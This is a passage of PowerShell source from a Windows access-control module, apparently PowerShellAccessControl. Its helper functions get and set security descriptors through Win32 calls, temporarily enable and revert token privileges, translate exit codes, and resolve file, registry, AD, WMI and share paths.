            [ref] $pGroup, 
            [ref] $pDacl,
            [ref] $pSacl,
            [ref] $pSecurityDescriptor
        )

        [PowerShellAccessControl.PInvoke.advapi32]::$FunctionName.Invoke($Arguments) | 
            CheckExitCode -ErrorAction Stop -Action "Getting security descriptor for '$FirstArgument'"


        if ($pSecurityDescriptor -eq [System.IntPtr]::Zero) {
            # I've seen this happen with ADMIN shares (\\.\c$); ReturnValue is 0,
            # but no SD is returned.
            #
            # Invalid pointer, so no need to try to free the memory
            Write-Error "No security descriptor available for '$FirstArgument'"
            return
        }

        try {
            # Get size of security descriptor:
            $SDSize = [PowerShellAccessControl.PInvoke.advapi32]::GetSecurityDescriptorLength($pSecurityDescriptor)
            Write-Debug "$($MyInvocation.MyCommand): SD size = $SDSize bytes"

            # Put binary SD in byte array:
            $ByteArray = New-Object byte[] $SDSize
            [System.Runtime.InteropServices.Marshal]::Copy($pSecurityDescriptor, $ByteArray, 0, $SDSize)

            # Output array:
            $ByteArray
        }
        catch {
            Write-Error $_
        }
        finally {
            # Clear memory from SD:
            Write-Debug "$($MyInvocation.MyCommand): Freeing SD memory"
            [PowerShellAccessControl.PInvoke.kernel32]::LocalFree($pSecurityDescriptor) | 
                CheckExitCode -Action "Freeing memory for security descriptor ($FirstArgument)"
        }
    }
    catch {
        Write-Error $_
    }
    finally {
        if ($AdjustPrivResults.PrivilegeChanged) {
            # Privilege was changed earlier, so now it must be reverted:

            $AdjustPrivResults = SetTokenPrivilege -Privilege SeSecurityPrivilege -Disable

            if ($AdjustPrivResults.PrivilegeChanged -eq $false) {
                Write-Error "Error reverting SeSecurityPrivilege back to disabled!"
            }
        }
    }
}

function script:SetSecurityInfo {
  <#
      Wraps the PInvoke signature for SetNamedSecurityInfo and SetSecurityInfo. Path validation is up
      to the caller (but this function should return a meaningful error message if an error is encountered)

  #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0, ParameterSetName="Named")]
        [string] $Path,
        [Parameter(Mandatory=$true, Position=0, ParameterSetName="NotNamed")]
        [IntPtr] $Handle,
        [Parameter(Mandatory=$true)]
        [System.Security.AccessControl.ResourceType] $ObjectType,
        [System.Security.Principal.IdentityReference] $Owner,
        [System.Security.Principal.IdentityReference] $Group,
        [System.Security.AccessControl.DiscretionaryAcl] $DiscretionaryAcl,
        [System.Security.AccessControl.SystemAcl] $SystemAcl,
        [PowerShellAccessControl.PInvoke.SecurityInformation] $SecurityInformation
    )

    if (-not $PSBoundParameters.ContainsKey("SecurityInformation")) {
        # SecurityInformation enum wasn't provided, so function will
        # build it up using the sections that were provided
        $SecurityInformation = 0
    }

    # If SecurityInformation was specified, the following section may still modify it. Example would
    # be if SecurityInformation contained 'Dacl, ProtectedDacl' and the Owner parameter was supplied,
    # 'Owner' would be added to the SecurityInformation flag. The provided SecurityInformation will
    # be bor'ed with the flags for any of the four SD sections that are provided.

    # Get binary forms of sections:
    foreach ($SectionName in "Owner", "Group", "DiscretionaryAcl", "SystemAcl") {

        if ($PSBoundParameters.ContainsKey($SectionName)) {

            $Section = $PSBoundParameters.$SectionName

            $SectionLength = $Section.BinaryLength

            if (-not $PSBoundParameters.ContainsKey("SecurityInformation")) {
                # SecurityInformation wasn't provided to function, so it's the function's
                # job to determine what needs to be set. It will do that by looking at the
                # sections that were passed

                # This will convert 'DiscretionaryAcl' to 'Dacl' and 'SystemAcl' to 'Sacl'
                # so that the section names will match with the SecurityInfo enum (Owner and
                # Group already match)
                $FlagName = $SectionName -replace "(ystem|iscretionary)A", "a"

                $SecurityInformation = $SecurityInformation -bor [PowerShellAccessControl.PInvoke.SecurityInformation]::$FlagName
            }

            if ($SectionLength -ne $null) {
                $ByteArray = New-Object byte[] $SectionLength
                $Section.GetBinaryForm($ByteArray, 0)
            }
            else {
                # In this scenario, a null section was passed, but the function was called
                # with this section enabled, so a null ACL will be applied
                $ByteArray = $null
            }
        }
        else {
            # Section wasn't specified, so no ptr
            $ByteArray = $null
        }

        Set-Variable -Scope Local -Name $SectionNameByteArray -Value $ByteArray -Confirm:$false -WhatIf:$false
    }

    # Function and arguments are slightly different depending on param set:
    if ($PSCmdlet.ParameterSetName -eq "Named") {
        $FunctionName = "SetNamedSecurityInfo"
        $FirstArgument = $Path
    }
    else {
        $FunctionName = "SetSecurityInfo"
        $FirstArgument = $Handle
    }

    Write-Debug "$($MyInvocation.MyCommand): Setting security descriptor for '$FirstArgument' ($ObjectType) with the following sections: $SecurityInformation"

    if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::Sacl) {
        # Make sure SeSecurityPrivilege is enabled
        $SecurityPrivResults = SetTokenPrivilege -Privilege SeSecurityPrivilege
    }

    if ($SecurityInformation -band [PowerShellAccessControl.PInvoke.SecurityInformation]::Owner) {
        # Attempt to grant SeTakeOwnershipPrivilege and SeRestorePrivilege. If privilege isn't held,
        # no error should be generated. That being said, these privs aren't always needed, so might
        # end up putting logic here (or in Set-SecurityDescriptor) that checks to see if the current
        # user has WRITE_OWNER and if the new owner is the current user (or a group that the current
        # user has the Owner attribute set), then no privs are necessary. Also, if the current user
        # doesn't have WRITE_OWNER, but they want the take ownership, then SeRestorePrivilege isn't
        # required. Just some stuff to think about...
        $TakeOwnershipPrivResults = SetTokenPrivilege -Privilege SeTakeOwnershipPrivilege
        $RestorePrivilegeResults = SetTokenPrivilege -Privilege SeRestorePrivilege
    }

    try {
        [PowerShellAccessControl.PInvoke.advapi32]::$FunctionName.Invoke(
            $FirstArgument,
            $ObjectType,
            $SecurityInformation,
            $OwnerByteArray, 
            $GroupByteArray, 
            $DiscretionaryAclByteArray,
            $SystemAclByteArray
        ) | CheckExitCode -ErrorAction Stop -Action "Setting security descriptor for '$FirstArgument'"
    }
    catch {
        Write-Error $_
    }
    finally {

        foreach ($PrivilegeResult in ($SecurityPrivResults, $TakeOwnershipPrivResults, $RestorePrivilegeResults)) {
            if ($PrivilegeResult.PrivilegeChanged) {
                # If this is true, then the privilege was changed, so it needs to be
                # reverted back. If it's false, then the privilege wasn't changed (either
                # b/c the user doesn't hold the privilege, or b/c it was already enabled;
                # it doesn't really matter why). So, disable it if it was successfully
                # enabled earlier.
    
                $NewResult = SetTokenPrivilege -Privilege $PrivilegeResult.PrivilegeName -Disable
                if (-not $NewResult.PrivilegeChanged) {
                    # This is an error; privilege wasn't changed back to original setting
                    Write-Error ("Error reverting {0}" -f $PrivilegeResult.PrivilegeName)
                }
            }
        }
    }
}

function script:GetWmiObjectInfo {
  <#
      Takes as input a WMI or CimInstance object. Returns as output an object with the following
      properties: ClassName, ComputerName, Path, Namespace.

      All of those properties are readily available for either type of object, but they are located
      in different properties depending on the type of the object. This function returns a common,
      known format for the properties that GetPathInformation can use.
  #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, Position=0)]
        $WmiObject
    )

    process {
        $Properties = @{}
        switch -Wildcard ($WmiObject.GetType().FullName) {
            "Microsoft.Management.Infrastructure.CimInstance" {
                $Properties.ClassName = $WmiObject.CimSystemProperties.ClassName
                $Properties.ComputerName = $WmiObject.CimSystemProperties.ServerName
                $Properties.Path = $WmiObject | Get-CimPathFromInstance
                $Properties.Namespace = $WmiObject.CimSystemProperties.Namespace
            }
            "System.Management.Management*Object" {
                $Properties.ClassName = $WmiObject.__CLASS
                $Properties.ComputerName = $WmiObject.__SERVER
                $Properties.Path = $WmiObject.__PATH
                $Properties.Namespace = $WmiObject.__NAMESPACE
            }
            default {
                throw "Unknown WMI object!"
            }
        }
        New-Object PSObject -Property $Properties
    }

}

function script:SetTokenPrivilege {

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [int] $ProcessId = $pid,
        [Parameter(Mandatory=$true)]
        [ValidateSet( # Taken from Lee Holmes' privilege script:
            "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", 
            "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", 
            "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege", 
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", 
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", 
            "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
            "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", 
            "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", 
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege"
        )]
        [string] $Privilege,
        [switch] $Disable
    )
    
    begin {
        $Advapi32 = [PowerShellAccessControl.PInvoke.advapi32]
        $Kernel32 = [PowerShellAccessControl.PInvoke.kernel32]
    }

    process {

        if ($Disable) {
            $Action = "disable"
        }
        else {
            $Action = "enable"
        }

        # Wrap the process handle in a HandleRef to make sure it isn't GC'd:
        $Process = Get-Process -Id $ProcessId
        $hRef = New-Object System.Runtime.InteropServices.HandleRef ($Process, $Process.Handle)

        try {
            # Open the process token:
            $Message = "Getting token handle for '{0}' process ({1})" -f $Process.Name, $Process.Id
            Write-Debug "$($MyInvocation.MyCommand): $Message"

            $TokenHandle = [System.IntPtr]::Zero
            $Advapi32::OpenProcessToken(
                $hRef, 
                [System.Security.Principal.TokenAccessLevels] "AdjustPrivileges, Query",
                [ref] $TokenHandle
            ) | CheckExitCode -Action $Message

            # Look up the LUID for the privilege
            $LUID = New-Object PowerShellAccessControl.PInvoke.advapi32+LUID
            $Advapi32::LookupPrivilegeValue(
                $null,  # SystemName param; null means local system
                $Privilege,
                [ref] $LUID
            ) | CheckExitCode -Action "Looking up ID for '$Privilege' privilege"


            $LuidAndAttributes = New-Object PowerShellAccessControl.PInvoke.advapi32+LUID_AND_ATTRIBUTES
            $LuidAndAttributes.Luid = $LUID

            if ($Disable) {
                $LuidAndAttributes.Attributes = [PowerShellAccessControl.PInvoke.advapi32+PrivilegeAttributes]::Disabled
            }
            else {
                $LuidAndAttributes.Attributes = [PowerShellAccessControl.PInvoke.advapi32+PrivilegeAttributes]::Enabled
            }

            # Initialize some arguments for AdjustTokenPrivileges call
            $TokenPrivileges = New-Object PowerShellAccessControl.PInvoke.advapi32+TOKEN_PRIVILEGES
            $TokenPrivileges.PrivilegeCount = 1
            $TokenPrivileges.Privileges = $LuidAndAttributes

            $PreviousState = New-Object PowerShellAccessControl.PInvoke.advapi32+TOKEN_PRIVILEGES
            $ReturnLength = 0

            $Message = "Setting '$Privilege' to $Actiond"
            Write-Debug "$($MyInvocation.MyCommand): $Message"
        
            $Advapi32::AdjustTokenPrivileges(
                $TokenHandle,
                $false, # Disable all privileges
                [ref] $TokenPrivileges,  # NewState
                [System.Runtime.InteropServices.Marshal]::SizeOf($PreviousState),
                [ref] $PreviousState,    # PreviousState
                [ref] $ReturnLength
            ) | CheckExitCode -Action $Message -ErrorAction Stop
        }
        catch {
            Write-Error $_
        }
        finally {
            # Check out $PreviousState. If privilege was changed, PrivilegeCount will
            # be greater than 0 (for our PInvoke signature, 1 is the highest we'll ever
            # see; we can only change one at a time
            $PrivilegeChanged = [bool] $PreviousState.PrivilegeCount
            Write-Debug "$($MyInvocation.MyCommand): Privilege changed: $PrivilegeChanged"

            Write-Debug "$($MyInvocation.MyCommand): Closing token handle"
            $Kernel32::CloseHandle($TokenHandle) | CheckExitCode -Action "Error closing token handle: $_" -ErrorAction Stop
        }

        # Create a return object
        New-Object PSObject -Property @{
            PrivilegeName = $Privilege
            ReturnCode = $ReturnCode
            PreviousState = $PreviousState
            PrivilegeChanged = $PrivilegeChanged
        }
    }
}

function script:CheckExitCode {
  <#
      Writes an error message if the provided code is non-zero.
  #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $ExitCode,
        [switch] $WriteWarnings,
        [switch] $VerboseSuccesses,
        $Action
    )

    process {

        # ExitCode needs to an Int32, but I didn't want to make that be all that the input
        # takes. For that reason, we convert UInt32s to Int32s
        if ($ExitCode -isnot [int]) {
            try { 
                $ExitCode = [int] $ExitCode
            }
            catch {
                try {
                    $ExitCode = [System.BitConverter]::ToInt32([System.BitConverter]::GetBytes($ExitCode), 0)
                }
                catch {
                    Write-Error ("Can't convert '{0}' to [int]" -f $ExitCode.GetType().FullName)
                    return
                }
            }
        }

        if ($Action) {
            $Action = "{0}: " -f $Action
        }
        else {
            $Action = $null
        }

        try {
            $ErrorMessage = "{0}{1}" -f $Action, ([System.ComponentModel.Win32Exception] $ExitCode).Message
        }
        catch {
            Write-Error $_
            return
        }

        if ($ExitCode) {
            $Params = @{
                Message = $ErrorMessage   
            }

            if ($WriteWarnings) {
                $CmdletToUse = "Write-Warning"
            }
            else {
                $CmdletToUse = "Write-Error"
                $Params.ErrorId = $ExitCode
            }

            & $CmdletToUse @Params
        }
        else {
            if ($VerboseSuccesses) {
                Write-Verbose $ErrorMessage
            }
        }
    }
}

function script:GetPathInformation {
  <#
      This is the function that (hopefully) allows the functions that get and set the security descriptors to know
      all necessary information about the object the user is interested in. It should be able to tell if it's a
      container (like a folder, registry key, WMI namespace, DS object, etc), if its a DS object, what access mask
      enumeration to use, the SdPath (used by GetSecurityInfo and SetSecurityInfo), the Path (a friendlier version
      of the path; might be a PsPath, might be a text form of a WMI or CIM object), DisplayName (usually the path,
      but sometimes extra information is conveyed), the ObjectType (used by Get and SetSecurityInfo), etc.

      It should be able to take as input path strings, actual objects (.NET objects, WMI/CIM objects, WsMan objects,
      etc). The output should be able to be splatted into New-AdaptedSecurityDescriptor (you'll still need the SDDL
      or binary forms of the security descriptor)
  #>
    [CmdletBinding(DefaultParameterSetName='Path')]
    param(
        [Parameter(Mandatory=$true, ParameterSetName='InputObject', ValueFromPipeline=$true)]
        $InputObject,
        [Parameter(ParameterSetName='DirectPath', ValueFromPipelineByPropertyName=$true)]
        [Parameter(ParameterSetName='Path', Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        # Path that the Get-Item cmdlet can use to get an object.
        [string[]] $Path = ".",
        [Parameter(Mandatory=$true, ParameterSetName='LiteralPath', ValueFromPipelineByPropertyName=$true)]
        # Literal path taht the Get-Item cmdlet can use to get an object
        [string[]] $LiteralPath,
        [Parameter(ParameterSetName='DirectPath', ValueFromPipelineByPropertyName=$true)]
        [System.Security.AccessControl.ResourceType] $ObjectType,
        [Parameter(ParameterSetName='DirectPath')]
        [switch] $IsContainer = $false,
        [Parameter(ValueFromRemainingArguments=$true)]
        $__RemainingArguments
    )

    begin {
        # The process block has two main steps:
        #   Step 1: Collect potential input objects into the $InputObject variable. If that parameter was
        #           passed, then the function gets to skip step #1
        #   Step 2: Go through each object in the $InputObject variable. If the pstypenames property
        #           contains the following string, the object will not be "inspected" as much. This was
        #           originally used for when the path and ObjectType were explicitly supplied (notice
        #           the 'DirectPath' parameter set name), but it is actually used some in step #1, too.
        $DirectPathObjectType = "PowerShellAccessControl.DirectPath"
    }

    process {

        # Step 1: Convert everything to objects (unless $InputObject was the parameter supplied). 
        #      1.1: If paths were provided instead of objects, try to use Resolve-Path to get the fully resolved path, and the 
        #           type of the object the path points to. If that works, add a custom object with whatever info we were able
        #           to obtain, and give it a type of $DirectPathObjectType.
        #      1.2: If Resolve-Path can't handle it (and it wasn't already a DirectPath), check to see if it's some sort of
        #           path that this module is aware of (the module uses WMI/CIM path information kind of like a drive; also LDAP://
        #           paths can be used, etc
        try {
            switch ($PSCmdlet.ParameterSetName) {
                <#
                    If a path is defined, this function will first attempt to use Resolve-Path to see if it is a path
                    to a file, folder, or registry key (resolve-path isn't used if the -ObjectType parameter was passed;
                    that's handled in the second switch condition). If it's not a file, folder, or registry key, an error
                    will be thrown, and the catch block will check to see if it's a path format that this module created...

                    NOTE: This function used to use Get-Item for Path and LiteralPath param sets, but that means that you
                          have to have read access in order for the function to return, and read access isn't always necessary
                          to get/change a security descriptor. Doing it this way means that there's no read access requirement.
                #>
                { $_ -eq "Path" -or $_ -eq "LiteralPath" } {
                    # Pass either the -Path or -LiteralPath param and its value (depends on param set name)
                    $ResolvePathParams = @{
                        $PSCmdlet.ParameterSetName = $PSBoundParameters[$PSCmdlet.ParameterSetName]
                        ErrorAction = "Stop"
                    }

                    # Notice that whether or not the object is a container is being stored in a property called PsIsContainer. That's
                    # to mimic the behavior that will occur if an object (FileInfo, DirectoryInfo, RegistryKey) is passed intead of
                    # a path that is inspected w/ Resolve-Path (or a direct path where the -IsContainer parameter determines whether
                    # or not the object is a container)

                    $InputObject = foreach ($CurrentPath in (Resolve-Path @ResolvePathParams)) {
                        $ReturnObjectProperties = @{}
                        switch ($CurrentPath.Provider) {

                            Microsoft.PowerShell.Core\FileSystem {
                                $ReturnObjectProperties.Path = $ReturnObjectProperties.DisplayName = $ReturnObjectProperties.SdPath = $CurrentPath.ProviderPath
                                $ReturnObjectProperties.ObjectType += [System.Security.AccessControl.ResourceType]::FileObject
                                try {
                                    $ReturnObjectProperties.PsIsContainer = [bool]([System.IO.File]::GetAttributes($CurrentPath.ProviderPath) -band [System.IO.FileAttributes]::Directory)
                                }
                                catch {
                                    # There was an error checking on this, so assume it's not a container:
                                    Write-Warning ("Couldn't determine if '{0}' is a file or directory; treating as a file" -f $CurrentPath.ProviderPath)
                                    $ReturnObjectProperties.PsIsContainer = $false
                                }
                            }

                            Microsoft.PowerShell.Core\Registry {
                                $ReturnObjectProperties.SdPath = $CurrentPath.ProviderPath -replace "^HKEY_(LOCAL_)?"
                                $ReturnObjectProperties.ObjectType = [System.Security.AccessControl.ResourceType]::RegistryKey
                                $ReturnObjectProperties.PsIsContainer = $true
                                $ReturnObjectProperties.Path = $CurrentPath.Path
                                $ReturnObjectProperties.DisplayName = $CurrentPath.ProviderPath
                            }

                            Microsoft.ActiveDirectory.Management\ActiveDirectory {
                                # Path should be in the form of {qualifier}:\{dn}
                                # We want the dn, so use Split-Path to remove the qualifier (which
                                # could be something other than the default AD:\
                                $ReturnObjectProperties.SdPath = (Split-Path $CurrentPath.Path -NoQualifier) -replace "(^\\)?"
                                $ReturnObjectProperties.ObjectType = [System.Security.AccessControl.ResourceType]::DSObjectAll
                                $ReturnObjectProperties.Path = $ReturnObjectProperties.DisplayName = $CurrentPath.Path
                            }

                            { $_ -match "^PowerShellAccessControl" } {
                            
                                # Proxy Resolve-Path function can handle long paths (somewhat). Provider returned is either
                                # PowerShellAccessControlDirectory or PowerShellAccessControlFile
                                $ReturnObjectProperties.SdPath = "\\?\{0}" -f $CurrentPath.Path
                                $ReturnObjectProperties.DisplayName = $ReturnObjectProperties.Path = $CurrentPath.Path
                                $ReturnObjectProperties.ObjectType = [System.Security.AccessControl.ResourceType]::FileObject
                                $ReturnObjectProperties.PsIsContainer = $CurrentPath.Provider -match "Directory$"
                            }
                            
                            default {
                                throw ("Unknown path provider: $_")
                            }
                        }   
                        
                        $ReturnObject = New-Object PSObject -Property $ReturnObjectProperties
                        $ReturnObject.pstypenames.Insert(0, $DirectPathObjectType)  # Function will inspect object type later
                        $ReturnObject
                    }

                    if ($InputObject -eq $null) {
                        Write-Error ("Error resolving path: {0}" -f $PSBoundParameters[$PSCmdlet.ParameterSetName])
                    }
                }

                "DirectPath" {
                    $InputObject = foreach ($CurrentPath in $Path) {
                        $ReturnObject = New-Object PSObject -Property @{
                            SdPath = $CurrentPath
                            ObjectType = $ObjectType
                            PsIsContainer = $IsContainer
                        }

                        $ReturnObject.pstypenames.Insert(0, $DirectPathObjectType)
                        $ReturnObject
                    }

                }

                "InputObject" {
                    # No extra work needed
                }

                default {
                    # Shouldn't happen
                    Write-Error "Unknown parameter set name!"
                    return
                }
            }
        }
        catch {
            <#
                Three possibilities:
                  1. An invalid path was presented, in which case we should write the error, then exit this iteration of the
                     function
                  2. The path is specially crafted by this module:
                       - WMI object
                       - Service object
                       - Process object
                     In that case, the module should understand the string. If it doesn't, it will throw an error.
                  3. The path is an AD path. If the path is in the form LDAP://{distinguishedname}, then everything works
                     great. If it doesn't have the LDAP:// prefix, then things might not work so well. To try to handle 
                     that, I have a check to see if 'DC=' is somewhere in the path. If so, [adsi]::Exists() is called
                     to see if it appears to be a valid AD path. If so, the path is modified to start with LDAP so the
                     switch statement will craft an object that can be used to create the adapted SD.
            #>
            
            $Paths = $PSBoundParameters[$PSCmdlet.ParameterSetName]
            $OriginalError = $_
            $InputObject = @()
            foreach ($CurrentPath in $Paths) {
                try {
                    if ($CurrentPath -match "^(?!LDAP://).*DC=" -and [adsi]::Exists("LDAP://{0}" -f $CurrentPath)) {
                        $CurrentPath = "LDAP://$CurrentPath"
                    }
                }
                catch {
                    # Don't need to do anything here since the path didn't have to be for AD
                }

                try {
                    $Qualifier = (Split-Path $CurrentPath -Qualifier -ErrorAction Stop).TrimEnd(":")
                    $PathWithoutQualifier = (Split-Path $CurrentPath -NoQualifier -ErrorAction Stop).Trim()

                    switch ($Qualifier) {
                        "ManagementObject" {
                            $InputObject += [wmi] $PathWithoutQualifier
                        }
                        
                        "CimInstance" {
                            $InputObject += Get-CimInstanceFromPath $PathWithoutQualifier
                        }

                        "Service" {
                            if ($PathWithoutQualifier -notmatch "^\\\\(?<computer>.*)\\(?<service>.*)$") {
                                throw "catch me"
                            }

                            $InputObject += Get-Service -ComputerName $matches.computer -Name $matches.service
                        }

                        "Process" {
                            if ($PathWithoutQualifier -notmatch "\(PID (?<processid>\d+)\)$") {
                                throw "catch me"
                            }

                            $InputObject += Get-Process -Id $matches.processid
                        }

                        LDAP {
                            $ReturnObject = New-Object PSObject -Property @{
                                # Get rid of any leading slashes
                                SdPath = $PathWithoutQualifier -replace "^\/*"
                                ObjectType = [System.Security.AccessControl.ResourceType]::DSObjectAll
                            }

                            $ReturnObject.pstypenames.Insert(0, $DirectPathObjectType)
                            $InputObject += $ReturnObject
                        }

                        default {
                            # Must not be in proper path format!
                            throw "Catch this below and write original error"
                        }
                    }
                }
                catch {
                    throw $OriginalError
                    continue
                }
            }            
        }

        # Step 2: Go through each $InputObject and assemble all known information about it. That might include inspecting
        #         the underlying object.
    :ObjectLoop foreach ($Object in $InputObject) {
            if ($Object -eq $null) { continue} 

            $OutputProperties = @{
                # This is usually just disposed of by the calling function, but in some instances it's useful
                # information
                InputObject = $Object
            }

            # One of this functions most important jobs is figuring out if the supplied object is a
            # container, since the inheritance and propagation flags allowed on ACEs contained in
            # SDs depends on that. Here, we check to see if the object that was supplied to this function
            # contains the information. There are several types of objects where this check doesn't matter
            # because the IsContainer is going to be hard coded to true or false, but NTFS permissions
            # definitely need this check since the object could be a file or a folder.
            # Note that this property may exist b/c a FileInfo, DirectoryInfo, RegistryKey, etc object
            # was passed into this function, or it may have been added earlier in this function b/c
            # a path was passed.
            if ($Object.PSIsContainer -ne $null) {
                $OutputProperties.IsContainer = $Object.PSIsContainer
            }

            Write-Debug "$($MyInvocation.MyCommand): Current object type: $($Object.GetType().FullName)"
            switch ($Object.GetType().FullName) {
                { $_ -match "System\.(Security\.AccessControl|DirectoryServices)\.(\w+)Security" } {
                    # User has passed a native .NET SD into the calling function. As of v3.0, the module should
                    # be able to handle those SDs, so this function is going to call itself against the path
                    # contained in the SD, but it is also going to add the Sddl from the SD's Sddl property
                    # to the output. The calling function will know that it shouldn't look up the SD at
                    # that point. This is desireable b/c this means that Get-SecurityDescriptor can now call
                    # on this function and convert a live, in-memory SD into the SD format that this module
                    # uses. This opens up the ability for Get-Ace and Set-SD to work with native .NET SDs.

                    Write-Debug "$($MyInvocation.MyCommand): Security descriptor is native .NET class ($_). Creating temporary 'Adapted SD'..."
                    # First, get path information. This will fill in the DisplayName, Path, ObjectType, etc
                    if ($Object.Path) {
                        try {
                            $OutputProperties = GetPathInformation -Path $Object.Path -ErrorAction Stop

                            # If there was an issue (and no errors were written), $OutputProperties will be $null. That's
                            # bad, so throw an error and let the catch {} block handle it
                            if ($OutputProperties -eq $null) { throw "Unable to get path information for security descriptor" }
                        }
                        catch {
                            Write-Error "Error getting access control entries from .NET class '$_'"
                            continue ObjectLoop
                        }
                    }
                    else {
                        # Using AD module w/ ntSecurityDescriptor or msExchMailboxSecurityDescriptor properites 
                        # will return an object w/ an empty Path property. Not sure if there are other scenarios.

                        # Try to get all of the necessary information (ObjectType is biggest we need to know; if other
                        # information is missing later, it gets filled in):
                        $OutputProperties.DisplayName = "[UNKNOWN]"
                        Write-Debug "$($MyInvocation.MyCommand): No path information available; setting DisplayName to $($OutputProperties.DisplayName)"

                        switch ($_) {
                            System.Security.AccessControl.DirectorySecurity {
                                $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::FileObject
                                $OutputProperties.IsContainer = $true
                            }

                            System.Security.AccessControl.FileSecurity {
                                $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::FileObject
                                $OutputProperties.IsContainer = $false
                            }

                            System.DirectoryServices.ActiveDirectorySecurity {
                                $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::DSObjectAll
                            }

                            default {
                                Write-Error "Unable to get path information for the security descriptor. Use New-AdaptedSecurityDescriptor to convert this into an adapted security descriptor."
                                continue ObjectLoop
                            }
                        }
                    }

                    # Give the display name something to show that this is just an in-memory SD
                    $OutputProperties.DisplayName = "{0} (Converted .NET SD)" -f $OutputProperties.DisplayName

                    # Add the SDDL of the current SD:
                    $OutputProperties.Sddl = $Object.Sddl
                }


                { $Object.pstypenames -eq $DirectPathObjectType } {
                    # Direct path means that the function shouldn't do any inspection on the object. Maybe
                    # the user is looking for Share permissions by supplying a path; if left up to the module
                    # to figure out what to do, it would see that path as a valid file path, and lookup NTFS
                    # permissions. If the user supplied the -ObjectType to Get-SD, then direct path mode
                    # goes into effect, and the module just accepts what the user told it. Another area where
                    # this is useful is paths too long for the .NET framework.
                    $OutputProperties.SdPath = $Object.SdPath
                    if ($Object.Path -eq $null) {
                        $OutputProperties.Path = $Object.SdPath
                    }
                    else {
                        $OutputProperties.Path = $Object.Path
                    }
                    $OutputProperties.ObjectType = $Object.ObjectType
                    if ($Object.DisplayName -eq $null) {
                        $OutputProperties.DisplayName = "{0} ({1})" -f $OutputProperties.SdPath, $OutputProperties.ObjectType
                    }
                    else {
                        $OutputProperties.DisplayName = $Object.DisplayName
                    }
                }

                { $_ -like "System.Management.Management*Object" -or
                  $_ -eq "Microsoft.Management.Infrastructure.CimInstance" } {

                    # WMI object; we might be able to work with this
                    # To find out, lets get some info from it:
                    $WmiInfo = GetWmiObjectInfo $Object

                    # Path that allows module to get a WMI object back
                    $OutputProperties.Path = "{0}: {1}" -f $Object.GetType().Name, $WmiInfo.Path

                    # And another switch :)
                    switch ($WmiInfo.ClassName) {

                        "Win32_Service" {
                            $OutputProperties.SdPath = "\\{0}\{1}" -f $WmiInfo.ComputerName, $Object.Name
                            $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::Service
                            $OutputProperties.DisplayName = "Service: {0}" -f $Object.DisplayName
                        }

                        { $_ -eq "Win32_Printer" -or $_ -eq "MSFT_Printer" } {
                            $OutputProperties.SdPath = "\\{0}\{1}" -f $WmiInfo.ComputerName, $Object.Name
                            $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::Printer
                            $OutputProperties.DisplayName = "Printer: {0}" -f $Object.Name
                        }

                        "__SystemSecurity" {
                            # This isn't handled by Get/Set SecurityInfo cmdlets (which use Win32 calls), but it is handled
                            # by the module. We're going to set the paths to a string that this function can later use to
                            # get the WMI object back
                            $OutputProperties.SdPath = $OutputProperties.Path = "{0}: {1}" -f $Object.GetType().Name, $WmiInfo.Path
                            $OutputProperties.ObjectType = $__PowerShellAccessControlResourceTypeName
                            $OutputProperties.DisplayName = "WMI Namespace: {0}" -f $WmiInfo.Namespace
                            $OutputProperties.AccessMaskEnum = [PowerShellAccessControl.WmiNamespaceRights]
                            $OutputProperties.IsContainer = $true
                        }

                        { $_ -eq "Win32_LogicalShareSecuritySetting" -or $_ -eq "Win32_Share" -or $_ -eq "MSFT_SmbShare" } {
                            $OutputProperties.SdPath = "\\{0}\{1}" -f $WmiInfo.ComputerName, $Object.Name
                            $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::LMShare
                            $OutputProperties.DisplayName = "Share: {0}" -f $Object.Name
                        }

                        "Win32_Process" {
                            
                            GetPathInformation -InputObject (Get-Process -Id $Object.ProcessId)
                            continue ObjectLoop
                        }

                        { "__SecurityDescriptor", "Win32_SecurityDescriptor" -contains $_ } {
                            $OutputProperties.Path = $OutputProperties.DisplayName = "[Win32_SecurityDescriptor]"
                            $OutputProperties.Sddl = $InputObject | ConvertFrom-Win32SecurityDescriptor -Sddl | select -exp Sddl
                            $OutputProperties.IsContainer = $true # Assume always a container so that inheritance flags on containers aren't messed up
                            $OutputProperties.ObjectType = $__PowerShellAccessControlResourceTypeName
                        }

                        default {
                            Write-Error ("Unsupported WMI class: {0}" -f $_)
                            continue ObjectLoop
                        }
                    }
                }

                { $Object.pstypenames -contains "Microsoft.ActiveDirectory.Management.ADObject" } {
                    # AD object from ActiveDirectory module was passed
                    $OutputProperties.SdPath = $OutputProperties.Path = $OutputProperties.DisplayName = $Object.DistinguishedName
                    $OutputProperties.ObjectType = [System.Security.AccessControl.ResourceType]::DSObjectAll
                    $OutputProperties.DsObjectClass = $Object.ObjectClass
                }


                "Microsoft.Win32.RegistryKey" {
